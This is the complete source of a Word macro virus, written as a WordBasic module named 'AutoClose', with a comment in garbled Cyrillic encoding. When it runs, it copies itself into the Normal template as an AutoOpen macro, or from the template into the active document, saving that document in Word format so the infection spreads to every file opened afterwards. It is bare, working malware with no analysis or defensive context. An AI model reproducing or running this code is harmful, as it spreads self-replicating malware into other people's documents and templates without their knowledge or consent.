   Attribute VB_Name = "AutoClose"

   Public Sub Main()
   Dim Count_
   Dim F
   Dim i
   Dim Name_$
   Dim NameActiveFile$
   Rem Êîë-âî ìàêðîêîìàíä â øàáëîíå Normal
       Count_ = WordBasic.CountMacros(0)
       F = 0
       For i = 1 To Count_
        Name_$ = WordBasic.[MacroName$](i, 0)
        If Name_$ = "AutoOpen" Then F = 1
       Next i
       NameActiveFile$ = WordBasic.[FileNameFromWindow$](0)
       If F = 0 Then WordBasic.MacroCopy NameActiveFile$ + ":AutoClose", "Normal:AutoOpen"
       If F = 1 Then WordBasic.FileSaveAs Name:=NameActiveFile$, Format:=1: WordBasic.MacroCopy "Normal:AutoOpen", NameActiveFile$ + ":AutoClose": WordBasic.FileSaveAs Name:=NameActiveFile$, Format:=1

   End Sub
